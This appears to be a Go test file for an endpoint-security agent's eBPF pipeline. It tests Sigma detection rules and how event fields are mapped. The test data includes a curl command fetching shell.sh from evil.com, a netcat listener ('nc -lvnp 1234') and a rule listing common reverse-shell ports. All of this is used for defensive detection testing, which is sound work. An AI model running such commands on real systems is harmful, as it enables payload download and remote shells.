package ebpf

import (
	"sync"
	"testing"
	"time"

	"aegis-agent/internal/monitor"
	"aegis-agent/internal/sigma"
	pb "aegis-agent/pkg/api/v1"
)

type testReporter struct {
	mu    sync.Mutex
	batch [][]*pb.RuntimeEvent
}

func (r *testReporter) ReportEvents(events []*pb.RuntimeEvent) error {
	r.mu.Lock()
	defer r.mu.Unlock()

	cp := make([]*pb.RuntimeEvent, len(events))
	copy(cp, events)
	r.batch = append(r.batch, cp)
	return nil
}

func (r *testReporter) totalEvents() int {
	r.mu.Lock()
	defer r.mu.Unlock()

	total := 0
	for _, b := range r.batch {
		total += len(b)
	}
	return total
}

func (r *testReporter) firstEvent() *pb.RuntimeEvent {
	r.mu.Lock()
	defer r.mu.Unlock()

	if len(r.batch) == 0 || len(r.batch[0]) == 0 {
		return nil
	}
	return r.batch[0][0]
}

func TestPipelineReportsOnlySigmaMatchedEvents(t *testing.T) {
	loader := sigma.NewLoader(t.TempDir())
	err := loader.LoadAll([]sigma.Rule{
		{
			ID:    "rule-1",
			Title: "match malware commandline",
			Level: "high",
			Tags:  []string{"attack.T1059"},
			Logsource: sigma.Logsource{
				Category: "process_creation",
				Product:  "linux",
			},
			Detection: sigma.Detection{
				Selections: map[string]any{
					"selection": map[string]any{
						"CommandLine": "malware",
					},
				},
				Condition: "selection",
			},
		},
	})
	if err != nil {
		t.Fatalf("load sigma rules: %v", err)
	}

	reporter := &testReporter{}
	collector := NewCollector("host-1", 10)
	pipeline := NewPipeline(collector, loader, reporter, "host-1", monitor.NewMetrics())

	done := make(chan struct{})
	go pipeline.Run(done)

	collector.events <- Event{HostID: "host-1", Hostname: "test-host", EventType: "process_exec", ProcessName: "bash", CommandLine: "/bin/bash -lc whoami", Timestamp: time.Now().UnixMilli(), PID: 100, PPID: 1, UID: 0}
	collector.events <- Event{HostID: "host-1", Hostname: "test-host", EventType: "process_exec", ProcessName: "bash", CommandLine: "/bin/bash -lc malware --run", Timestamp: time.Now().UnixMilli(), PID: 101, PPID: 1, UID: 0}

	close(done)
	time.Sleep(100 * time.Millisecond)

	if reporter.totalEvents() != 1 {
		t.Fatalf("expected exactly 1 reported event, got %d", reporter.totalEvents())
	}

	reported := reporter.firstEvent()
	if reported == nil {
		t.Fatal("expected a reported event")
	}

	if reported.GetMatchedRuleId() != "rule-1" {
		t.Fatalf("expected matched rule id rule-1, got %q", reported.GetMatchedRuleId())
	}
	if reported.GetSeverity() != "high" {
		t.Fatalf("expected severity high, got %q", reported.GetSeverity())
	}
	if reported.GetMitreId() != "T1059" {
		t.Fatalf("expected mitre id T1059, got %q", reported.GetMitreId())
	}
}

func TestBuildEventMapImageExeFields(t *testing.T) {
	p := &Pipeline{
		hostname: "test-host",
		metrics:  monitor.NewMetrics(),
	}

	event := Event{
		EventType:   "process_exec",
		PID:         1234,
		ProcessName: "curl",
		CommandLine: "/usr/bin/curl -x socks5://proxy:1080 http://evil.com/shell.sh",
		FilePath:    "/usr/bin/curl",
	}

	eventMap := p.buildEventMap(event)

	if eventMap["image"] != "/usr/bin/curl" {
		t.Errorf("image = %q, want %q", eventMap["image"], "/usr/bin/curl")
	}
	if eventMap["exe"] != "/usr/bin/curl" {
		t.Errorf("exe = %q, want %q", eventMap["exe"], "/usr/bin/curl")
	}
	if eventMap["commandline"] != "/usr/bin/curl -x socks5://proxy:1080 http://evil.com/shell.sh" {
		t.Errorf("commandline should contain full command, got %q", eventMap["commandline"])
	}
}

func TestBuildEventMapExeFromCommandLine(t *testing.T) {
	p := &Pipeline{
		hostname: "test-host",
		metrics:  monitor.NewMetrics(),
	}

	event := Event{
		EventType:   "process_exec",
		PID:         5678,
		ProcessName: "bash",
		CommandLine: "/bin/bash -c 'echo hello'",
		FilePath:    "",
	}

	eventMap := p.buildEventMap(event)
	if eventMap["image"] != "/bin/bash" {
		t.Errorf("image = %q, want /bin/bash (from cmdline first token)", eventMap["image"])
	}
	if eventMap["exe"] != "/bin/bash" {
		t.Errorf("exe = %q, want /bin/bash (from cmdline first token)", eventMap["exe"])
	}
}

func TestBuildEventMapIncludesArgsTruncated(t *testing.T) {
	p := &Pipeline{
		hostname: "test-host",
		metrics:  monitor.NewMetrics(),
	}

	eventMap := p.buildEventMap(Event{
		EventType:     "process_exec",
		ProcessName:   "nc",
		CommandLine:   "nc -lvnp 1234",
		ArgsTruncated: true,
	})

	if eventMap["args_truncated"] != true {
		t.Fatalf("args_truncated = %v, want true", eventMap["args_truncated"])
	}
}

func TestT1547SystemBinaryWriteDetection(t *testing.T) {
	// Load the T1547 rule
	loader := sigma.NewLoader(t.TempDir())
	err := loader.LoadAll([]sigma.Rule{
		{
			ID:    "aegis-file-system-binary-write",
			Title: "System Binary Directory Write",
			Level: "high",
			Tags:  []string{"attack.t1547"},
			Logsource: sigma.Logsource{
				Category: "file_event",
				Product:  "linux",
			},
			Detection: sigma.Detection{
				Selections: map[string]any{
					"selection_path": map[string]any{
						"TargetFilename|startswith": []any{
							"/usr/bin/",
							"/usr/sbin/",
							"/bin/",
							"/sbin/",
						},
					},
					"selection_action": map[string]any{
						"event.action": []any{
							"open_write",
							"create",
							"truncate",
							"rename",
						},
					},
				},
				Condition: "selection_path and selection_action",
			},
		},
	})
	if err != nil {
		t.Fatalf("load sigma rules: %v", err)
	}

	reporter := &testReporter{}
	collector := NewCollector("host-1", 10)
	pipeline := NewPipeline(collector, loader, reporter, "host-1", monitor.NewMetrics())

	done := make(chan struct{})
	go pipeline.Run(done)

	// Test case: echo "test" > /usr/bin/aegis_test_binary
	// This should trigger T1547 detection
	collector.events <- Event{
		HostID:      "host-1",
		Hostname:    "test-host",
		EventType:   "file_access",
		ProcessName: "bash",
		PID:         1234,
		PPID:        1,
		UID:         0,
		Timestamp:   time.Now().UnixMilli(),
		FilePath:    "/usr/bin/aegis_test_binary",
		FileName:    "aegis_test_binary",
		FileDir:     "/usr/bin",
		FileAction:  "create",
		FileFlags:   "O_WRONLY,O_CREAT,O_TRUNC",
	}

	close(done)
	time.Sleep(200 * time.Millisecond)

	if reporter.totalEvents() != 1 {
		t.Fatalf("expected exactly 1 reported event for T1547, got %d", reporter.totalEvents())
	}

	reported := reporter.firstEvent()
	if reported == nil {
		t.Fatal("expected a reported event")
	}

	if reported.GetMatchedRuleId() != "aegis-file-system-binary-write" {
		t.Fatalf("expected matched rule id aegis-file-system-binary-write, got %q", reported.GetMatchedRuleId())
	}
	if reported.GetMitreId() != "T1547" {
		t.Fatalf("expected mitre id T1547, got %q", reported.GetMitreId())
	}
	if reported.GetSeverity() != "high" {
		t.Fatalf("expected severity high, got %q", reported.GetSeverity())
	}
}

func TestBuildEventMapFileAccessFieldNames(t *testing.T) {
	p := &Pipeline{
		hostname: "test-host",
		metrics:  monitor.NewMetrics(),
	}

	event := Event{
		EventType:   "file_access",
		PID:         1234,
		ProcessName: "bash",
		FilePath:    "/usr/bin/aegis_test_binary",
		FileName:    "aegis_test_binary",
		FileDir:     "/usr/bin",
		FileAction:  "create",
		FileFlags:   "O_WRONLY,O_CREAT,O_TRUNC",
	}

	eventMap := p.buildEventMap(event)

	// Test that category is set correctly
	if eventMap["category"] != "file_event" {
		t.Errorf("category = %q, want %q", eventMap["category"], "file_event")
	}

	// Test that TargetFilename is set (used by Sigma rules)
	targetFilename, ok := eventMap["TargetFilename"]
	if !ok {
		t.Error("TargetFilename not found in event map")
	}
	if targetFilename != "/usr/bin/aegis_test_binary" {
		t.Errorf("TargetFilename = %q, want %q", targetFilename, "/usr/bin/aegis_test_binary")
	}

	// Test that event.action is set (used by Sigma rules)
	action, ok := eventMap["event.action"]
	if !ok {
		t.Error("event.action not found in event map")
	}
	if action != "create" {
		t.Errorf("event.action = %q, want %q", action, "create")
	}

	// Test lowercase field names for Sigma compatibility
	lowerTargetFilename, ok := eventMap["targetfilename"]
	if !ok {
		t.Error("targetfilename (lowercase) not found in event map - Sigma matcher will fail!")
	}
	if lowerTargetFilename != "/usr/bin/aegis_test_binary" {
		t.Errorf("targetfilename = %q, want %q", lowerTargetFilename, "/usr/bin/aegis_test_binary")
	}
}

func TestSigmaMatcherFieldNameCaseInsensitive(t *testing.T) {
	// Test that the matcher can find fields regardless of case
	rule := sigma.Rule{
		ID:    "test-rule",
		Title: "Test Rule",
		Level: "high",
		Tags:  []string{"attack.t1547"},
		Logsource: sigma.Logsource{
			Category: "file_event",
			Product:  "linux",
		},
		Detection: sigma.Detection{
			Selections: map[string]any{
				"selection": map[string]any{
					"TargetFilename|startswith": "/usr/bin/",
				},
			},
			Condition: "selection",
		},
	}

	compiled := sigma.CompileRule(&rule)

	// Test with mixed case key (current behavior)
	eventMapMixedCase := map[string]any{
		"category":       "file_event",
		"TargetFilename": "/usr/bin/test",
	}

	// Test with lowercase key (expected by Sigma)
	eventMapLowercase := map[string]any{
		"category":       "file_event",
		"targetfilename": "/usr/bin/test",
	}

	mixedCaseMatch := compiled.Match(eventMapMixedCase)
	lowercaseMatch := compiled.Match(eventMapLowercase)

	if lowercaseMatch {
		t.Log("Lowercase field name matches correctly")
	} else {
		t.Error("Lowercase field name should match")
	}

	if mixedCaseMatch {
		t.Log("Mixed case field name matches")
	} else {
		t.Error("Mixed case field name should also match (case-insensitive lookup needed)")
	}
}

func TestNetworkAcceptEventMap(t *testing.T) {
	// Test that buildEventMap correctly populates fields for network_accept events.
	// Scenario: external host (10.0.0.5:54321) connects to agent host (34.174.207.156:8081).
	p := &Pipeline{
		hostname: "test-host",
		metrics:  monitor.NewMetrics(),
	}

	event := Event{
		EventType:        "network_accept",
		ProcessName:      "nginx",
		PID:              1234,
		PPID:             1,
		UID:              0,
		Timestamp:        time.Now().UnixMilli(),
		SrcIP:            "34.174.207.156",
		SrcPort:          8081,
		DstIP:            "10.0.0.5",
		DstPort:          54321,
		Protocol:         "tcp",
		NetworkDirection: "inbound",
		ConnectStatus:    "success",
		RemoteAddr:       "10.0.0.5:54321",
	}

	eventMap := p.buildEventMap(event)

	// Category must be network_connection (same as outbound)
	if eventMap["category"] != "network_connection" {
		t.Errorf("category = %v, want network_connection", eventMap["category"])
	}

	// Source port should be the local listening port (8081)
	if eventMap["sourceport"] != uint16(8081) {
		t.Errorf("sourceport = %v, want 8081", eventMap["sourceport"])
	}
	if eventMap["SourcePort"] != uint16(8081) {
		t.Errorf("SourcePort = %v, want 8081", eventMap["SourcePort"])
	}

	// Source IP should be the local listening IP
	if eventMap["sourceip"] != "34.174.207.156" {
		t.Errorf("sourceip = %v, want 34.174.207.156", eventMap["sourceip"])
	}

	// Destination should be the remote client
	if eventMap["destinationport"] != uint16(54321) {
		t.Errorf("destinationport = %v, want 54321", eventMap["destinationport"])
	}
	if eventMap["destinationip"] != "10.0.0.5" {
		t.Errorf("destinationip = %v, want 10.0.0.5", eventMap["destinationip"])
	}

	// Protocol
	if eventMap["network.transport"] != "tcp" {
		t.Errorf("network.transport = %v, want tcp", eventMap["network.transport"])
	}

	// Direction
	if eventMap["network_direction"] != "inbound" {
		t.Errorf("network_direction = %v, want inbound", eventMap["network_direction"])
	}
}

func TestNetworkAcceptSigmaMatch(t *testing.T) {
	// End-to-end test: network_accept event should match inbound high-risk port rule.
	loader := sigma.NewLoader(t.TempDir())
	err := loader.LoadAll([]sigma.Rule{
		{
			ID:    "aegis-network-high-risk-inbound-port",
			Title: "High Risk Inbound TCP Port",
			Level: "high",
			Tags:  []string{"attack.t1043"},
			Logsource: sigma.Logsource{
				Category: "network_connection",
				Product:  "linux",
			},
			Detection: sigma.Detection{
				Selections: map[string]any{
					"selection": map[string]any{
						"SourcePort":         []any{4444, 5555, 31337, 1234, 8443, 8081},
						"network.transport": "tcp",
					},
					"filter_local": map[string]any{
						"SourceIp|startswith": []any{"127.", "::1"},
					},
				},
				Condition: "selection and not filter_local",
			},
		},
	})
	if err != nil {
		t.Fatalf("load sigma rules: %v", err)
	}

	reporter := &testReporter{}
	collector := NewCollector("host-1", 10)
	pipeline := NewPipeline(collector, loader, reporter, "host-1", monitor.NewMetrics())

	done := make(chan struct{})
	go pipeline.Run(done)

	// Event: external host connects to agent on port 8081
	collector.events <- Event{
		HostID:           "host-1",
		Hostname:         "test-host",
		EventType:        "network_accept",
		ProcessName:      "nginx",
		PID:              5678,
		PPID:             1,
		UID:              0,
		Timestamp:        time.Now().UnixMilli(),
		SrcIP:            "34.174.207.156",
		SrcPort:          8081,
		DstIP:            "10.0.0.5",
		DstPort:          54321,
		Protocol:         "tcp",
		NetworkDirection: "inbound",
		ConnectStatus:    "success",
		RemoteAddr:       "10.0.0.5:54321",
	}

	close(done)
	time.Sleep(200 * time.Millisecond)

	if reporter.totalEvents() != 1 {
		t.Fatalf("expected exactly 1 reported event, got %d", reporter.totalEvents())
	}

	reported := reporter.firstEvent()
	if reported == nil {
		t.Fatal("expected a reported event")
	}

	if reported.GetMatchedRuleId() != "aegis-network-high-risk-inbound-port" {
		t.Fatalf("expected matched rule id aegis-network-high-risk-inbound-port, got %q", reported.GetMatchedRuleId())
	}
	if reported.GetSeverity() != "high" {
		t.Fatalf("expected severity high, got %q", reported.GetSeverity())
	}
	if reported.GetMitreId() != "T1043" {
		t.Fatalf("expected mitre id T1043, got %q", reported.GetMitreId())
	}
	if reported.GetRemoteAddr() != "10.0.0.5:54321" {
		t.Fatalf("expected remote addr 10.0.0.5:54321, got %q", reported.GetRemoteAddr())
	}
}
